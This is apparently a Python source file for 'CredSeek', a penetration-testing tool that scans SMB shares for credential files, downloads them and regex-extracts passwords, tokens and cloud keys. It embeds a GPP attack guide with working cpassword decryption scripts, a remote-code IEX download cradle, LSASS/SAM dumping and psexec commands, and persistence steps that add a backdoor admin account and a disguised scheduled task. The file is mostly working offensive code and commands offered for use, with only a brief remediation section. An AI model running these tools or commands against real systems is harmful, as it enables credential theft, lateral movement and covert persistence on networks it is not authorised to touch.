#!/usr/bin/env python3
"""
CredSeek v1.0 - Credential Harvesting Tool
Searches for credentials in SMB shares, files, and configurations

Features:
- Password file discovery (*.txt, *.docx, *.xlsx with "password" in name)
- Configuration file scanning (.env, config.php, web.config, etc.)
- SSH key discovery (id_rsa, *.ppk, *.pem)
- KeePass database discovery (*.kdbx)
- GPP password extraction from SYSVOL
- Git repository discovery (.git/)
- Database connection strings
- Hardcoded credentials in scripts

Usage:
    ./credseek.py                          # Quick scan (file discovery only)
    ./credseek.py --deep                   # Deep scan (read file contents)
    ./credseek.py --shares smblist.txt     # Scan specific SMB shares
    ./credseek.py --gpp dclist.txt         # GPP password extraction from DCs
    
Output:
    credlist.txt        - Hosts with potential credentials
    found_files.txt     - Credential files found
    found_creds.txt     - Extracted credentials
    cred_details.txt    - Detailed findings
    cred_details.json   - JSON export
"""

import socket
import subprocess
import sys
import json
import re
import os
import ipaddress

# Import shared utilities
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from seek_utils import find_ip_list
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

# Color codes for terminal output
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Credential file patterns
CRED_FILE_PATTERNS = {
    'password_files': [
        '*password*', '*passwd*', '*pwd*', '*credential*', '*cred*',
        '*secret*', '*auth*', '*login*', '*.kdbx', '*.kdb'
    ],
    'config_files': [
        '.env', '*.env', 'config.php', 'web.config', 'app.config',
        'settings.ini', 'config.ini', 'database.yml', 'config.json',
        'appsettings.json', 'connection.config', '.htpasswd'
    ],
    'ssh_keys': [
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', '*.pem', '*.ppk',
        'authorized_keys', 'known_hosts', '*.key'
    ],
    'backup_files': [
        '*.bak', '*.backup', '*.old', '*.save', '*.sql', '*.dump'
    ],
    'script_files': [
        '*.sh', '*.bat', '*.cmd', '*.ps1', '*.vbs', '*.py', '*.pl', '*.rb'
    ],
    'git_repos': [
        '.git', '.svn', '.hg'
    ]
}

# Regex patterns for credential extraction
CRED_PATTERNS = {
    'password': [
        r'password\s*[=:]\s*["\']?([^"\'\s]+)["\']?',
        r'pwd\s*[=:]\s*["\']?([^"\'\s]+)["\']?',
        r'passwd\s*[=:]\s*["\']?([^"\'\s]+)["\']?',
        r'pass\s*[=:]\s*["\']?([^"\'\s]+)["\']?'
    ],
    'username': [
        r'user(?:name)?\s*[=:]\s*["\']?([^"\'\s]+)["\']?',
        r'login\s*[=:]\s*["\']?([^"\'\s]+)["\']?',
        r'uid\s*[=:]\s*["\']?([^"\'\s]+)["\']?'
    ],
    'api_key': [
        r'api[_-]?key\s*[=:]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?',
        r'apikey\s*[=:]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?',
        r'api[_-]?secret\s*[=:]\s*["\']?([a-zA-Z0-9_\-]{20,})["\']?'
    ],
    'token': [
        r'token\s*[=:]\s*["\']?([a-zA-Z0-9_\-\.]{20,})["\']?',
        r'access[_-]?token\s*[=:]\s*["\']?([a-zA-Z0-9_\-\.]{20,})["\']?',
        r'auth[_-]?token\s*[=:]\s*["\']?([a-zA-Z0-9_\-\.]{20,})["\']?'
    ],
    'db_connection': [
        r'(?:mysql|postgresql|mssql|oracle)://([^:]+):([^@]+)@([^/:\s]+)',
        r'Server\s*=\s*([^;]+);\s*(?:Database|Initial Catalog)\s*=\s*([^;]+);\s*(?:User Id|UID)\s*=\s*([^;]+);\s*Password\s*=\s*([^;]+)',
        r'mongodb://([^:]+):([^@]+)@([^/:\s]+)'
    ],
    'aws_key': [
        r'AKIA[0-9A-Z]{16}',  # AWS Access Key ID
        r'aws[_-]?access[_-]?key[_-]?id\s*[=:]\s*["\']?([A-Z0-9]{20})["\']?',
        r'aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})["\']?'
    ],
    'private_key': [
        r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----'
    ]
}

# Common credential locations on SMB shares
INTERESTING_PATHS = [
    'SYSVOL',  # GPP passwords
    'NETLOGON',  # Login scripts
    'Backup',
    'Backups',
    'Scripts',
    'Config',
    'Configuration',
    'Admin',
    'IT',
    'Users',
    'Shared',
    'Public',
    'Documents',
    'www',
    'htdocs',
    'webroot'
]

# Banner
BANNER = f"""{CYAN}{BOLD}
 ██████╗██████╗ ███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║ ██╔╝
██║     ██████╔╝█████╗  ██║  ██║███████╗█████╗  █████╗  █████╔╝ 
██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║██╔══╝  ██╔══╝  ██╔═██╗ 
╚██████╗██║  ██║███████╗██████╔╝███████║███████╗███████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
{YELLOW}CredSeek v1.0 - Credential Harvesting Tool{RESET}
{BLUE}Searches for credentials in files, shares, and configurations{RESET}
{GREEN}github.com/Lokii-git/seeksweet{RESET}
"""


def print_banner():
    """Print the tool banner"""
    print(BANNER)


def read_ip_list(file_path):
    """Read IP addresses from a file. Supports CIDR notation."""
    # Use shared utility to find the file
    file_path = find_ip_list(file_path)
    
    ips = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Extract just the IP if line contains more info
                    ip = line.split()[0]
                    
                    # Check if it's CIDR notation
                    if '/' in ip:
                        try:
                            network = ipaddress.ip_network(ip, strict=False)
                            for host_ip in network.hosts():
                                ips.append(str(host_ip))
                        except ValueError:
                            # Not valid CIDR, treat as single IP
                            ips.append(ip)
                    else:
                        ips.append(ip)
    except Exception as e:
        print(f"{RED}[!] Error reading file {file_path}: {e}{RESET}")
    return ips


def check_smb_shares(ip, timeout=3):
    """
    List SMB shares on a host using smbclient
    Returns: list of share names
    """
    shares = []
    try:
        # Try null session first
        cmd = ['smbclient', '-L', f'//{ip}', '-N', '--timeout', str(timeout)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                # Parse share lines (format: "ShareName   Type   Comment")
                if 'Disk' in line or 'IPC' in line:
                    parts = line.split()
                    if parts:
                        share_name = parts[0].strip()
                        if share_name and not share_name.startswith('\\\\'):
                            shares.append(share_name)
        
    except Exception:
        pass
    
    return shares


def search_share_for_files(ip, share, patterns=None, timeout=5):
    """
    Search a share for files matching patterns
    Returns: list of file paths
    """
    found_files = []
    
    if patterns is None:
        patterns = []
        for category in CRED_FILE_PATTERNS.values():
            patterns.extend(category)
    
    try:
        # Mount point format
        mount_point = f'//{ip}/{share}'
        
        for pattern in patterns:
            try:
                cmd = ['smbclient', mount_point, '-N', '-c', f'ls {pattern}', '--timeout', str(timeout)]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        # Parse file listings
                        if line.strip() and not line.startswith('.') and 'blocks available' not in line:
                            parts = line.split()
                            if parts:
                                filename = parts[0].strip()
                                if filename and filename not in ['.', '..']:
                                    file_path = f'\\\\{ip}\\{share}\\{filename}'
                                    found_files.append({
                                        'path': file_path,
                                        'pattern': pattern,
                                        'share': share
                                    })
            except Exception:
                continue
                
    except Exception:
        pass
    
    return found_files


def download_file_from_share(ip, share, remote_path, local_path, timeout=10):
    """
    Download a file from SMB share for analysis
    Returns: True if successful
    """
    try:
        mount_point = f'//{ip}/{share}'
        cmd = ['smbclient', mount_point, '-N', '-c', f'get {remote_path} {local_path}', '--timeout', str(timeout)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return result.returncode == 0
    except Exception:
        return False


def extract_credentials_from_text(text, source=''):
    """
    Extract credentials from text using regex patterns
    Returns: list of found credentials
    """
    found_creds = []
    
    for cred_type, patterns in CRED_PATTERNS.items():
        for pattern in patterns:
            try:
                matches = re.finditer(pattern, text, re.IGNORECASE | re.MULTILINE)
                for match in matches:
                    if cred_type == 'db_connection':
                        # Special handling for connection strings
                        groups = match.groups()
                        if len(groups) >= 3:
                            found_creds.append({
                                'type': 'database_connection',
                                'username': groups[0] if len(groups) > 0 else '',
                                'password': groups[1] if len(groups) > 1 else '',
                                'server': groups[2] if len(groups) > 2 else '',
                                'source': source,
                                'context': match.group(0)[:100]
                            })
                    else:
                        found_creds.append({
                            'type': cred_type,
                            'value': match.group(1) if match.groups() else match.group(0),
                            'source': source,
                            'context': match.group(0)[:100]
                        })
            except Exception:
                continue
    
    return found_creds


def check_gpp_passwords(dc_ip, timeout=10):
    """
    Check for Group Policy Preferences passwords in SYSVOL
    Returns: list of GPP credentials
    """
    gpp_creds = []
    
    try:
        # Try to access SYSVOL share
        mount_point = f'//{dc_ip}/SYSVOL'
        
        # Look for Groups.xml files (common GPP location)
        cmd = ['smbclient', mount_point, '-N', '-c', 'ls *Groups.xml', '--timeout', str(timeout)]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        
        if result.returncode == 0 and result.stdout:
            # Found Groups.xml files - these may contain cpassword
            gpp_creds.append({
                'dc': dc_ip,
                'type': 'GPP',
                'status': 'Groups.xml found - may contain cpassword',
                'action': 'Use gpp-decrypt or manual extraction'
            })
    except Exception:
        pass
    
    return gpp_creds


def analyze_file_content(file_path, max_size=1048576):
    """
    Analyze file content for credentials (max 1MB files)
    Returns: list of found credentials
    """
    try:
        file_size = os.path.getsize(file_path)
        if file_size > max_size:
            return []
        
        # Read file
        with open(file_path, 'rb') as f:
            content = f.read()
        
        # Try to decode as text
        try:
            text = content.decode('utf-8')
        except:
            try:
                text = content.decode('latin-1')
            except:
                return []
        
        # Extract credentials
        return extract_credentials_from_text(text, source=file_path)
        
    except Exception:
        return []


def scan_host(ip, args):
    """
    Scan a single host for credentials
    Returns: dict with findings
    """
    result = {
        'ip': ip,
        'shares': [],
        'files_found': [],
        'credentials': [],
        'gpp_passwords': [],
        'status': 'no_findings'
    }
    
    try:
        # Check SMB shares
        shares = check_smb_shares(ip, timeout=args.timeout)
        
        if not shares:
            return result
        
        result['shares'] = shares
        
        # Search interesting shares for credential files
        interesting_shares = [s for s in shares if any(path.lower() in s.lower() for path in INTERESTING_PATHS)]
        if not interesting_shares:
            interesting_shares = shares  # Search all if no interesting ones found
        
        for share in interesting_shares[:5]:  # Limit to first 5 shares
            try:
                files = search_share_for_files(ip, share, timeout=args.timeout)
                if files:
                    result['files_found'].extend(files)
            except Exception:
                continue
        
        # If deep scan enabled, download and analyze files
        if args.deep and result['files_found']:
            temp_dir = Path('temp_cred_files')
            temp_dir.mkdir(exist_ok=True)
            
            for idx, file_info in enumerate(result['files_found'][:10]):  # Limit to 10 files
                try:
                    local_path = temp_dir / f"{ip}_{idx}_{Path(file_info['path']).name}"
                    if download_file_from_share(ip, file_info['share'], 
                                                Path(file_info['path']).name, 
                                                str(local_path), 
                                                timeout=args.timeout):
                        creds = analyze_file_content(str(local_path))
                        if creds:
                            result['credentials'].extend(creds)
                        
                        # Cleanup
                        try:
                            os.remove(local_path)
                        except:
                            pass
                except Exception:
                    continue
        
        # Check for GPP passwords if this looks like a DC
        if any('SYSVOL' in share for share in shares):
            gpp = check_gpp_passwords(ip, timeout=args.timeout)
            if gpp:
                result['gpp_passwords'].extend(gpp)
        
        # Update status
        if result['files_found'] or result['credentials'] or result['gpp_passwords']:
            result['status'] = 'findings'
        
    except KeyboardInterrupt:
        raise
    except Exception as e:
        result['error'] = str(e)
    
    return result


def save_credlist(results, filename='credlist.txt'):
    """Save list of IPs with potential credentials"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['status'] == 'findings':
                    f.write(f"{result['ip']}\n")
        print(f"{GREEN}[+] Credential host list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving credential list: {e}{RESET}")


def save_found_files(results, filename='found_files.txt'):
    """Save list of credential files found"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("CREDSEEK - Credential Files Found\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['files_found']:
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Host: {result['ip']}\n")
                    f.write(f"Files Found: {len(result['files_found'])}\n")
                    f.write(f"{'=' * 80}\n")
                    
                    for file_info in result['files_found']:
                        f.write(f"\n  📄 {file_info['path']}\n")
                        f.write(f"     Pattern: {file_info['pattern']}\n")
                        f.write(f"     Share: {file_info['share']}\n")
        
        print(f"{GREEN}[+] Found files saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving found files: {e}{RESET}")


def save_found_credentials(results, filename='found_creds.txt'):
    """Save extracted credentials"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("CREDSEEK - Extracted Credentials\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            cred_count = 0
            
            for result in results:
                if result['credentials']:
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Host: {result['ip']}\n")
                    f.write(f"Credentials Found: {len(result['credentials'])}\n")
                    f.write(f"{'=' * 80}\n")
                    
                    for cred in result['credentials']:
                        cred_count += 1
                        f.write(f"\n  🔑 Credential #{cred_count}\n")
                        f.write(f"     Type: {cred['type']}\n")
                        
                        if cred['type'] == 'database_connection':
                            f.write(f"     Server: {cred.get('server', 'N/A')}\n")
                            f.write(f"     Username: {cred.get('username', 'N/A')}\n")
                            f.write(f"     Password: {cred.get('password', 'N/A')}\n")
                        else:
                            f.write(f"     Value: {cred.get('value', 'N/A')}\n")
                        
                        f.write(f"     Source: {cred.get('source', 'N/A')}\n")
                        f.write(f"     Context: {cred.get('context', '')[:100]}\n")
                
                if result['gpp_passwords']:
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Host: {result['ip']} - GPP Passwords\n")
                    f.write(f"{'=' * 80}\n")
                    
                    for gpp in result['gpp_passwords']:
                        f.write(f"\n  🔓 GPP Finding\n")
                        f.write(f"     Status: {gpp['status']}\n")
                        f.write(f"     Action: {gpp['action']}\n")
        
        print(f"{GREEN}[+] Extracted credentials saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving credentials: {e}{RESET}")


def save_details(results, filename='cred_details.txt'):
    """Save detailed scan results"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("CREDSEEK - Detailed Scan Results\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['status'] == 'findings':
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Host: {result['ip']}\n")
                    f.write(f"{'=' * 80}\n")
                    
                    if result['shares']:
                        f.write(f"\nSMB Shares ({len(result['shares'])}):\n")
                        for share in result['shares']:
                            f.write(f"  • {share}\n")
                    
                    if result['files_found']:
                        f.write(f"\nCredential Files Found ({len(result['files_found'])}):\n")
                        for file_info in result['files_found']:
                            f.write(f"  📄 {file_info['path']}\n")
                    
                    if result['credentials']:
                        f.write(f"\nExtracted Credentials ({len(result['credentials'])}):\n")
                        for cred in result['credentials']:
                            f.write(f"  🔑 {cred['type']}: {cred.get('value', 'See details')[:50]}\n")
                    
                    if result['gpp_passwords']:
                        f.write(f"\nGPP Passwords:\n")
                        for gpp in result['gpp_passwords']:
                            f.write(f"  🔓 {gpp['status']}\n")
                    
                    f.write("\n")
        
        print(f"{GREEN}[+] Detailed results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving details: {e}{RESET}")


def save_json(results, filename='cred_details.json'):
    """Save results as JSON"""
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{GREEN}[+] JSON results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving JSON: {e}{RESET}")


def save_gpp_attack_guide(filename='GPP_ATTACK_GUIDE.txt'):
    """Generate comprehensive GPP (Group Policy Preferences) attack guide"""
    guide_content = """
================================================================================
                GPP ATTACK GUIDE - CredSeek v1.0
      Comprehensive Guide to Group Policy Preferences Exploitation
================================================================================

This guide provides detailed information on GPP password extraction, exploitation
methodologies, and remediation strategies. Use responsibly and ethically.

================================================================================
                        TABLE OF CONTENTS
================================================================================

1. GPP BACKGROUND
2. VULNERABILITY OVERVIEW (MS14-025)
3. ENUMERATION TECHNIQUES
4. EXPLOITATION METHODS
5. MANUAL DECRYPTION
6. AUTOMATED TOOLS
7. POST-EXPLOITATION
8. DETECTION AND REMEDIATION
9. ALTERNATIVE CRED DISCOVERY
10. RESOURCES

================================================================================
                        1. GPP BACKGROUND
================================================================================

GROUP POLICY PREFERENCES (GPP)
-------------------------------
- Introduced in Windows Server 2008
- Allowed administrators to configure local users/groups via Group Policy
- Could store passwords for:
  * Local Administrator accounts
  * Scheduled tasks
  * Services
  * Data sources
  * Mapped drives
  * Printer connections

STORAGE LOCATION
----------------
All GPP configurations stored in SYSVOL:
\\\\domain.com\\SYSVOL\\domain.com\\Policies\\

Common GPP XML Files:
- Groups.xml        (Local users/groups)
- Services.xml      (Service accounts)
- Scheduledtasks.xml (Scheduled task accounts)
- DataSources.xml   (Database connections)
- Printers.xml      (Printer deployment)
- Drives.xml        (Mapped drives)

ACCESSIBILITY
-------------
- SYSVOL is readable by ALL domain users (authenticated users)
- No special privileges required
- Works from any domain-joined computer
- Works from Linux with domain credentials

================================================================================
                    2. VULNERABILITY OVERVIEW (MS14-025)
================================================================================

CVE-2014-1812
-------------
Microsoft published the AES encryption key used to "protect" GPP passwords.

Key Details:
- 32-byte AES-256 key published in MSDN documentation
- Key is same across ALL Windows domains worldwide
- Cannot be changed by administrators
- Allows anyone to decrypt GPP passwords

Impact:
- CRITICAL - Any domain user can decrypt GPP passwords
- Often leads to local administrator password disclosure
- May expose service account credentials
- Can compromise entire domain if admin accounts shared

Timeline:
- Vulnerability: 2008-2014 (6 years!)
- Disclosed: April 2014
- Patched: MS14-025 (May 2014)
- Patch only prevents NEW GPP passwords
- DOES NOT remove existing GPP passwords
- Legacy systems still vulnerable

================================================================================
                    3. ENUMERATION TECHNIQUES
================================================================================

METHOD 1: SMB FILE ENUMERATION
-------------------------------
# List SYSVOL contents (Windows)
dir \\\\domain.com\\SYSVOL\\domain.com\\Policies\\ /s

# Search for GPP XML files (Windows)
dir \\\\domain.com\\SYSVOL\\*.xml /s

# Find files containing "cpassword" (Windows)
findstr /S /I cpassword \\\\domain.com\\SYSVOL\\*.xml

# Linux with smbclient
smbclient //domain.com/SYSVOL -U 'DOMAIN\\user%password'
recurse ON
prompt OFF
mget *

# Linux with cifs-utils
mount -t cifs //domain.com/SYSVOL /mnt/sysvol -o username=user,domain=DOMAIN
grep -r "cpassword" /mnt/sysvol/

METHOD 2: CRACKMAPEXEC
----------------------
# Auto-find and decrypt GPP passwords
crackmapexec smb 10.10.10.10 -u user -p password -M gpp_password

# Multiple DCs
crackmapexec smb dclist.txt -u user -p password -M gpp_password

METHOD 3: IMPACKET
------------------
# Mount SYSVOL with smbclient.py
smbclient.py DOMAIN/user:password@10.10.10.10
use SYSVOL
ls
get Groups.xml

# Or use Get-GPPPassword.py (custom script)
python Get-GPPPassword.py DOMAIN/user:password@10.10.10.10

METHOD 4: METASPLOIT
--------------------
# Post-exploitation module
use post/windows/gather/credentials/gpp
set SESSION 1
run

# Or as auxiliary scanner
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS 10.10.10.10
set SMBUser user
set SMBPass password
run

METHOD 5: POWERSPLOIT (WINDOWS)
--------------------------------
# PowerSploit Get-GPPPassword
Import-Module PowerSploit.psd1
Get-GPPPassword

# Or inline
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
Get-GPPPassword

METHOD 6: MANUAL SEARCH (LINUX)
--------------------------------
# Mount SYSVOL
mkdir /mnt/sysvol
mount -t cifs //10.10.10.10/SYSVOL /mnt/sysvol -o user=username,domain=DOMAIN

# Find all GPP XML files
find /mnt/sysvol -name "*.xml" -type f

# Search for cpassword attribute
find /mnt/sysvol -name "*.xml" -type f -exec grep -l "cpassword" {} \\;

# Extract cpassword values
grep -r "cpassword=" /mnt/sysvol/ | cut -d'"' -f2

================================================================================
                    4. EXPLOITATION METHODS
================================================================================

TYPICAL ATTACK FLOW
-------------------
1. Obtain domain user credentials (ANY domain user)
2. Access SYSVOL share (read-only access sufficient)
3. Search for GPP XML files (Groups.xml, etc.)
4. Extract "cpassword" attribute values
5. Decrypt using public AES key
6. Use recovered credentials for privilege escalation

EXAMPLE GPP XML STRUCTURE
--------------------------
Groups.xml typically contains:
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="Administrator" 
        image="2" 
        changed="2012-06-14 13:01:23" 
        uid="{CD07A26F-A95B-4F4B-A6A9-5E7B05C1D4F0}">
    <Properties action="U" 
                newName="" 
                fullName="Built-in Administrator" 
                description="Local Administrator Account" 
                cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" 
                changeLogon="0" 
                noChange="1" 
                neverExpires="1" 
                acctDisabled="0" 
                userName="Administrator"/>
  </User>
</Groups>

The "cpassword" value is the encrypted password.

DECRYPTION PROCESS
------------------
1. Base64-decode the cpassword string
2. Use public AES-256 key (32 bytes):
   4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e5 
   f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
3. AES-256 decrypt in CBC mode
4. UTF-16LE decode to get plaintext password

PUBLIC AES KEY (Python bytes):
key = b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe5\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'

================================================================================
                    5. MANUAL DECRYPTION
================================================================================

PYTHON SCRIPT
-------------
#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_gpp_password(cpassword):
    # Microsoft published AES key
    key = b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe5\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'
    
    # Add padding if needed
    padding = len(cpassword) % 4
    if padding:
        cpassword += '=' * (4 - padding)
    
    # Decode base64
    encrypted = base64.b64decode(cpassword)
    
    # Extract IV (first 16 bytes)
    iv = encrypted[:16]
    ciphertext = encrypted[16:]
    
    # Decrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    # Decode UTF-16LE
    password = plaintext.decode('utf-16-le')
    return password

# Usage
cpassword = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
password = decrypt_gpp_password(cpassword)
print(f"Password: {password}")

RUBY SCRIPT (gpp-decrypt)
--------------------------
#!/usr/bin/env ruby
require 'openssl'
require 'base64'

def decrypt_gpp(cpassword)
  key = ["4e9906e8fcb66cc9faf4931062..."].pack("H*")
  
  # Decode and decrypt
  encrypted = Base64.decode64(cpassword)
  decipher = OpenSSL::Cipher.new('AES-256-CBC')
  decipher.decrypt
  decipher.key = key
  
  plaintext = decipher.update(encrypted) + decipher.final
  return plaintext.force_encoding('UTF-16LE').encode('UTF-8')
end

puts decrypt_gpp(ARGV[0])

POWERSHELL DECRYPTION
----------------------
function Decrypt-GPPPassword {
    param([string]$cpassword)
    
    $key = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
             0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe5,
             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
             0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
    
    # Add padding
    $mod = $cpassword.Length % 4
    if ($mod -ne 0) {
        $cpassword += '=' * (4 - $mod)
    }
    
    $encrypted = [Convert]::FromBase64String($cpassword)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.IV = $encrypted[0..15]
    
    $decryptor = $aes.CreateDecryptor()
    $plaintext = $decryptor.TransformFinalBlock($encrypted, 16, $encrypted.Length - 16)
    
    return [System.Text.Encoding]::Unicode.GetString($plaintext)
}

# Usage
$cpass = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
Decrypt-GPPPassword $cpass

================================================================================
                    6. AUTOMATED TOOLS
================================================================================

GPP-DECRYPT (KALI LINUX)
-------------------------
# Pre-installed on Kali Linux
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

# Install on other systems
gem install gpp-decrypt

CRACKMAPEXEC MODULE
-------------------
# Auto-find and decrypt
crackmapexec smb 10.10.10.10 -u user -p password -M gpp_password

# Output includes:
# - Username found
# - Decrypted password
# - XML file location

GET-GPPP

ASSWORD.PS1 (PowerSploit)
------------------------------------
# From Windows host (domain-joined)
Import-Module .\\PowerSploit.psd1
Get-GPPPassword

# Remote execution
Invoke-Command -ComputerName DC01 -ScriptBlock { Get-GPPPassword }

# Output format:
# UserName  : Administrator
# Password  : P@ssw0rd123
# Changed   : 6/14/2012 1:01:23 PM
# File      : \\\\domain.com\\SYSVOL\\..\\Groups.xml

METASPLOIT MODULE
-----------------
# Post module (requires session)
use post/windows/gather/credentials/gpp
set SESSION 1
run

# Scanner module (requires credentials)
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS 10.10.10.0/24
set SMBDomain DOMAIN
set SMBUser user
set SMBPass password
run

IMPACKET GET-GPPPassword.py
---------------------------
# Custom script (community-developed)
python3 Get-GPPPassword.py DOMAIN/user:password@10.10.10.10

# Or manual with smbclient.py
smbclient.py DOMAIN/user:password@10.10.10.10
use SYSVOL
recurse ON
prompt OFF
mget *.xml

# Then decrypt locally
grep -r "cpassword=" . | cut -d'"' -f2 | while read cpass; do
    gpp-decrypt "$cpass"
done

LINUX ONE-LINER
---------------
# Mount, search, extract, decrypt
mount -t cifs //10.10.10.10/SYSVOL /mnt/sysvol -o user=username,domain=DOMAIN && \\
grep -roP 'cpassword="\\K[^"]+' /mnt/sysvol | while read cpass; do gpp-decrypt "$cpass"; done

================================================================================
                    7. POST-EXPLOITATION
================================================================================

TYPICAL FINDINGS
----------------
1. Local Administrator passwords
   - Often same password across all workstations
   - Immediate privilege escalation on multiple systems
   
2. Service account credentials
   - May have elevated privileges
   - Could be domain admin
   
3. Scheduled task accounts
   - Often run with SYSTEM or admin privileges
   - Persistence opportunities

PRIVILEGE ESCALATION
---------------------
# If you find local admin password
crackmapexec smb 10.10.10.0/24 -u Administrator -p 'recovered_password' --local-auth

# Check SAM access
crackmapexec smb 10.10.10.50 -u Administrator -p 'recovered_password' --sam

# Dump LSASS
crackmapexec smb 10.10.10.50 -u Administrator -p 'recovered_password' --lsa

# Get shell
psexec.py Administrator:recovered_password@10.10.10.50

LATERAL MOVEMENT
----------------
# If password is reused across domain
crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_password'

# Check admin access
crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_password' --shares

# Execute commands
crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_password' -x whoami

PERSISTENCE
-----------
# If you get admin via GPP password
# Add new local admin (less likely to be detected)
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add

# Create scheduled task
schtasks /create /tn "Windows Update" /tr "cmd /c powershell -enc <base64>" /sc onlogon /ru SYSTEM

# Dump more credentials
secretsdump.py Administrator:recovered_password@10.10.10.50

================================================================================
                    8. DETECTION AND REMEDIATION
================================================================================

DETECTION
---------
1. Monitor SYSVOL access logs
   - Look for unusual patterns
   - Multiple XML file reads
   - Access from unexpected hosts

2. File integrity monitoring
   - Alert on GPP XML file creation
   - Alert on modifications

3. Group Policy auditing
   - Event ID 4662 (Operation performed on object)
   - Monitor "Read All Properties" on GP objects

4. PowerShell logging
   - Look for Get-GPPPassword execution
   - ScriptBlock logging for GPP keywords

REMEDIATION
-----------
1. DELETE GPP passwords immediately:
   # PowerShell - Find all GPP passwords
   Get-ChildItem -Path "\\\\domain.com\\SYSVOL" -Recurse -Include *.xml | 
   Select-String -Pattern "cpassword" | 
   Select-Object -ExpandProperty Path | 
   Get-Unique
   
   # Manually review and delete each file OR
   # Remove just the cpassword attribute

2. Use LAPS (Local Administrator Password Solution):
   - Microsoft's official solution
   - Randomizes local admin passwords
   - Stores in AD with ACLs
   - Automatic password rotation
   
   Download: https://www.microsoft.com/en-us/download/details.aspx?id=46899

3. Alternative: Use Configuration Manager
   - Centralized credential management
   - Proper encryption
   - Audit logging

